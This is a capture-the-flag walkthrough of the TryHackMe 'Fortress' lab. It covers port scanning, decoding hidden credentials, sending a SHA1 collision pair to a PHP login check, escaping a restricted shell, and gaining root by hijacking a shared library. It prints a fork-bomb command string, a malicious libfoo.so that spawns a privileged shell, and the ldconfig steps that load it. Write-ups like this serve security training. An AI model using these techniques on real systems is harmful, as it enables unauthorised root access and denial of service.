# [Fortress](https://tryhackme.com/room/fortress)

Doing as the box tells us, we add a couple of domain names to our `/etc/hosts`. After that, `nmap`.

```
# Nmap 7.92 scan initiated Wed Sep 15 14:56:50 2021 as: nmap -vvv -p 22,5581,5752,7331 -sCV -oA init 10.10.203.74
Nmap scan report for fortress (10.10.203.74)
Host is up, received conn-refused (0.21s latency).
Scanned at 2021-09-15 14:56:51 +07 for 90s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9f:d0:bb:c7:e2:ee:7f:91:fe:c2:6a:a6:bb:b2:e1:91 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCXx2nOQ7SVuA1liJqX+ZR2KK9Oipy+1cd4ZZ3iD+/xuAkvon338WPfjcGmNaBd0McHqunhvl1xJZZMsOsjVuMUSD0GUX3YF6BQ/RdVxQ00/gRvVW70nUk+kf+Umz/5HbI9IfBLoIcRGWxf3naUdl8Vfs7Fj38fnZB0A+8av3/VAthEhiOq58o9ssQJ7DD6ZJydt4R1G9WYa2C+8O76/rJ9EadLCaNAeKKUYmuGEdJit+vGsd4ggzYc0qJQ2QmRUrVK+FeIFZDIo4InaPIiI1VF0X+ooax1siytlF85f5956EfDsGgzNBZb/9I5tGz4QFnM/FH65fXEnvUrDoXO2+dj
|   256 06:4b:fe:c0:6e:e4:f4:7e:e1:db:1c:e7:79:9d:2b:1d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPBJBTN55zS77xduARAxZeA+xhJt04e3yVZpkmTObu2JMOjxTzFoK4mftWUdLsx1bs1mDIWWXLOKjXcnq3PcO84=
|   256 0d:0e:ce:57:00:1a:e2:8d:d2:1b:2e:6d:92:3e:65:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJezjvXtsHInz+XQ4hYfNBX5kjinTpiKRYaK5rF1og71
5581/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.21.200
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           305 Jul 25 20:06 marked.txt
5752/tcp open  unknown syn-ack
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions:
|     Chapter 1: A Call for help
|     Username: Password:
|   NULL:
|     Chapter 1: A Call for help
|_    Username:
7331/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5752-TCP:V=7.92%I=7%D=9/15%Time=6141A74A%P=x86_64-pc-linux-gnu%r(NU
SF:LL,28,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20")
SF:%r(GenericLines,32,"\n\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUs
SF:ername:\x20Password:\x20")%r(GetRequest,32,"\n\tChapter\x201:\x20A\x20C
SF:all\x20for\x20help\n\nUsername:\x20Password:\x20")%r(HTTPOptions,32,"\n
SF:\tChapter\x201:\x20A\x20Call\x20for\x20help\n\nUsername:\x20Password:\x
SF:20");
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 15 14:58:21 2021 -- 1 IP address (1 host up) scanned in 90.66 seconds
```

Looking at FTP on port 5581, we have anonymous login. In there, we have a couple of files we can download.

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jul 25 20:06 .
drwxr-xr-x    2 ftp      ftp          4096 Jul 25 20:06 ..
-rw-r--r--    1 ftp      ftp          1255 Jul 25 20:06 .file
-rw-r--r--    1 ftp      ftp           305 Jul 25 20:06 marked.txt
226 Directory send OK.
```

`marked.txt` is just a story piece with a hint towards `/home/veekay/ftp`, seeming to tell us to `mkdir` that.

```
If you're reading this, then know you too have been marked by the overlords... Help memkdir /home/veekay/ftp I have been stuck inside this prison for days no light, no escape... Just darkness... Find the backdoor and retrieve the key to the map... Arghhh, theyre coming... HELLLPPPPPmkdir /home/veekay/ftp
```

The file `.file`, however, is a "python 2.7 byte-compiled" file. Looking for a way to decompile python2, I found the tool `uncompyle`. Decompiling `.file` gives us `usern` and `passw` which are encoded using `bytes_to_long`, which we and decode using `long_to_bytes` to get "1337-h4x0r:n3v3r_g0nn4_g1v3_y0u_up"

We then go on to check out telnet on port 5752. We see the message "Chapter 1: A Call for help" which we saw in the decompiled python file and prompted for credentials, for which we can use the decoded creds from the previous `.file` from FTP to get the string "t3mple_0f_y0ur_51n5".

Moving on to the web server on port 7331, we have the default Ubuntu Apache2 page. I run `gobuster` and found a couple of pages.

```
/private.php          (Status: 200) [Size: 0]
/server-status        (Status: 403) [Size: 282]
```

The page `/private.php`, however, seems to have nothing. I then tried the previously found "t3mple_0f_y0ur_51n5" and found `/t3mple_0f_y0ur_51n5.php` with the title "Chapter 2". Looking at the source code, we have a couple of files as well as comments hinting at a GET request.

```html
<html>
<head>
	<title>Chapter 2</title>
	<link rel='stylesheet' href='assets/style.css' type='text/css'>
</head>
<body>
	<div id="container">
        <video width=100% height=100% autoplay>
            <source src="./assets/flag_hint.mp4" type=video/mp4>
        </video>


<!-- Hmm are we there yet?? May be we just need to connect the dots -->

<!--    <center>
			<form id="login" method="GET">
				<input type="text" required name="user" placeholder="Username"/><br/>
				<input type="text" required name="pass" placeholder="Password" /><br/>
				<input type="submit"/>
			</form>
		</center>
-->

    </div>

</body>
</html>
```

The file `flag_hint.mp4` is just a rick roll. Going to `assets/style.css` though, we find a base64-encoded string as a hint. Decoded, we have the following.

```
This is journey of the great monks, making this fortress a sacred world, defending the very own of their kinds, from what it is to be unleashed... The only one who could solve their riddle will be granted a KEY to enter the fortress world. Retrieve the key by COLLIDING those guards against each other.
```

The message put emphasis on "KEY" and "COLLIDING". We make note of it for later.

I then tried `t3mple_0f_y0ur_51n5.html` (HTML extension instead of PHP) and found a different page. Looking at the source code, we have some commented out PHP code.

```php
<?php
require 'private.php';
$badchar = '000000';
if (isset($_GET['user']) and isset($_GET['pass'])) {
    $test1 = (string)$_GET['user'];
    $test2 = (string)$_GET['pass'];

    $hex1 = bin2hex($test1);
    $hex2 = bin2hex($test2);


    if ($test1 == $test2) {
        print 'You can't cross the gates of the temple, GO AWAY!!.';
    }

    else if(strlen($test2) <= 500 and strlen($test1) <= 600){
    	print "<pre>Nah, babe that ain't gonna work</pre>";
    }

    else if( strpos( $hex1, $badchar ) or strpos( $hex2, $badchar )){
    	print '<pre>I feel pitty for you</pre>';
    }

    else if (sha1($test1) === sha1($test2)) {
      print "<pre>'Private Spot: '$spot</pre>";
    }

    else {
        print '<center>Invalid password.</center>';
    }
}
?>
```

It looks like we have to make a get request, presumably to `t3mple_0f_y0ur_51n5.php` because they're a PHP and an HTML file with mostly the same name, with a pair of `user` and `pass` such that they're different, are at least certain sizes, don't contain "000000", and have the same SHA1 hash. The hard part here is finding a hash collision.

Looking around for known SHA1 collisions, I came across [this article](https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html) which points to [this site](https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html) hosting 2 PDF files whose SHA1 hashes are the same. I downloaded the 2 PDFs and tried making a request with them as `user` and `pass`.

```python
#!/usr/bin/python3

import requests

with open("shattered-1.pdf", "rb") as f1, open("shattered-2.pdf", "rb") as f2:
    pdf1 = f1.read()
    pdf2 = f2.read()
params = {'user': pdf1, 'pass': pdf2}
r = requests.get("http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php/",params=params)
print (r.text)
```

Running script, however, gives us the error: "The requested URL's length exceeds the capacity". Our files are too big, seeing as [most web servers have a limit of 8KB](https://stackoverflow.com/a/2659995) but our files are each 413KB in size. We need to find smaller files also with the same SHA1 hash.

Looking around, I found that there's [a previous CTF challenge with the same conditions](https://www.linkedin.com/pulse/using-sha1-collision-attack-solve-bostonkeyparty-ctf-rotimi). That first post I found, however, uses the SHAttered PDFs we previously tried so I looked for more writeups for the same Boston Key Party CTF 2017 Prudential challenge.

  Looking up "Boston Key Party CTF 2017 Prudential challenge", I found [this writeup](https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md) which hosts 2 HTML files with the same SHA1 hash, so I downloaded them, run the script and got the following in the response.

```html
<pre>'The guards are in a fight with each other... Quickly retrieve the key and leave the temple: 'm0td_f0r_j4x0n.txt</pre><!-- Hmm are we there yet?? May be we just need to connect the dots -->
```

Going to `/m0td_f0r_j4x0n.txt`, we have an SSH key for the user "h4rdy", which we can use to SSH in.

The shell we get, however, is highly restricted, and we can't seem to run even the most basic commands.

```sh
h4rdy@fortress:~$ ls
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
```

Something might be run from `.bashrc` that's restricting our interaction so we rerun `ssh` while disabling `.bashrc`.

```sh
$ ssh -i id_rsa h4rdy@temple.fortress -t "bash --noprofile";
```

With that, we no longer have the previously present restrictions but still can't run our usual binaries.

```sh
h4rdy@fortress:~$ ls
Command 'ls' is available in '/bin/ls'
The command could not be located because '/bin' is not included in the PATH environment variable.
ls: command not found
```

  Checking `$PATH`, we find that it's set to `/home/h4rdy` where most of our usual binaries doesn't lie. We can either specify full paths for everything or export a new `$PATH`, of which I chose the second.

```sh
export PATH=/bin:/sbin/usr/local/sbin:/usr/local/bin:/usr/bin/
```

Checking `sudo -l`, we find that we can `cat` stuff as "j4x0n" without a password.

```sh
h4rdy@fortress:~$ sudo -l
Matching Defaults entries for h4rdy on fortress:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User h4rdy may run the following commands on fortress:
    (j4x0n) NOPASSWD: /bin/cat
```

With this, we can read j4x0n's `id_rsa` in `/home/j4x0n/.ssh` and login as them.

We can't run `sudo` without a password. Looking at the logs though, we have something interesting in `/var/log/auth.log`.

```
Jul 26 14:56:18 fortress sudo:    j4x0n : TTY=pts/0 ; PWD=/home/j4x0n ; USER=root ; COMMAND=/bin/bash -c echo "j4x0n:<REDACTED>" | chpasswd
```

j4x0n changed their password and it got recorded in `auth.log`. With this we can get a root shell. This, however, doesn't seem to be an intended route to root as [said by the author](https://belikeparamjot.medium.com/unintended-root-s-on-fortress-d6fa78d4a978), so we move on and find another way in. The `/data` directory also seems to be another unintended piece so we ignore it.

Checking our groups

```shj4x0n@fortress:~$ id
uid=1000(j4x0n) gid=1000(j4x0n) groups=1000(j4x0n),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

We see that j4x0n is in the `lxd` group. However, `lxd` isn't running or even installed so we have to look elsewhere.

The file `/opt/bt` is interesting as it' a non-standard SUID binary. Running it just prints a few messages and breaks our terminal. However, downloading the file to our local machine and analyzing it reveals more interesting things.

I'm using radare2 with the `r2ghidra` plugin for decompilation. Decompiling `main()` (run `pdg` from `r2ghidra`) gives us the following.

```cpp
undefined8 main(void)

{
    sym.imp.puts("Root Shell Initialized...");
    sym.imp.sleep(2);
    sym.imp.puts("Exploiting kernel at super illuminal speeds...");
    sym.imp.sleep(1);
    sym.imp.puts("Getting Root...");
    sym.imp.sleep(3);
    sym.imp.foo();
    return 0;
}
```

After a few prints, we have a call to `foo()`. However, we can't decompile `foo()`.

```cpp
void sym.imp.foo(void)

{
    // WARNING: Could not recover jumptable at 0x00001040. Too many branches
    // WARNING: Treating indirect jump as call
    (*_reloc.foo)();
    return;
}
```

Looking at dynamically linked libraries ...

```sh
$ ldd bt
	linux-vdso.so.1 (0x00007fff027f9000)
	libfoo.so => not found
	libc.so.6 => /usr/lib/libc.so.6 (0x00007fd72092a000)
	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fd720b1d000)
```

We see `libfoo.so` which is not found and non-standard. We can look for `libfoo.so` on the target machine.

```sh
j4x0n@fortress:~$ whereis libfoo.so
libfoo: /usr/lib/libfoo.so
```

We can then download the file to our local machine and analyze it in radare2. Viewing functions ...

```
[0x00001070]> afl
0x00001070    4 41   -> 34   entry0
0x00001125    1 89           sym.foo
0x00001030    1 6            sym.imp.puts
0x00001050    1 6            sym.imp.sleep
0x00001040    1 6            sym.imp.system
0x000010a0    4 57   -> 51   sym.register_tm_clones
0x000010e0    5 57   -> 50   sym.__do_global_dtors_aux
0x00001060    1 6            sym.imp.__cxa_finalize
0x00001120    1 5            entry.init0
0x00001180    1 9            sym._fini
0x00001000    3 23           sym._init
```

We see `sym.foo`. Decompiling the function ...

```cpp
void sym.foo(void)

{
    sym.imp.puts(0x2000);
    sym.imp.sleep(2);
    sym.imp.system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
    sym.imp.system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
    sym.imp.system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
    sym.imp.system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
    sym.imp.system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
    return;
}
```

We see that it `cat`s stuff from `/dev/urandom` which breaks our shell. If we can hijack this `libfoo.so`, we might be able to get a root shell, making use of the SUID bit of `/opt/bt`. To do that, we create our own `libfoo.so` and make `/opt/bt` use that instead of the current `libfoo.so`. First, we create write the code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void foo(){
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
}
```

Note that the function name needs to be the same `foo()` as called in `/opt/bt`. We then compile it into a shared object.

```sh
gcc -c foo.c -fPIC
gcc -shared foo.o -o libfoo.so
```

Looking at the original `libfoo.so`, we own it so we can replace it with our new `libfoo.so`, run `/opt/bt`, and get a root shell. This, however, is [another unintended part](https://belikeparamjot.medium.com/unintended-root-s-on-fortress-d6fa78d4a978). I tried `export LD_LIBRARY_PATH=/path/to/fake/libfoo.so` but that doesn't work.

Looking up "linux set library path", I found that [ldconfig can be used to change library paths](https://www.heelpbook.net/2016/setting-library-path-in-linux/). Following [GTFObins](https://gtfobins.github.io/gtfobins/ldconfig/#limited-suid) I put the malicious `libfoo.so` in `/tmp/privesc` and ran the following.

```
j4x0n@fortress:/tmp/privesc$ echo "/tmp/privesc/" > conf
j4x0n@fortress:/tmp/privesc$ ldconfig.real -f /tmp/privesc/conf
j4x0n@fortress:/tmp/privesc$ /opt/bt
```

With that, we should have a shell as root.
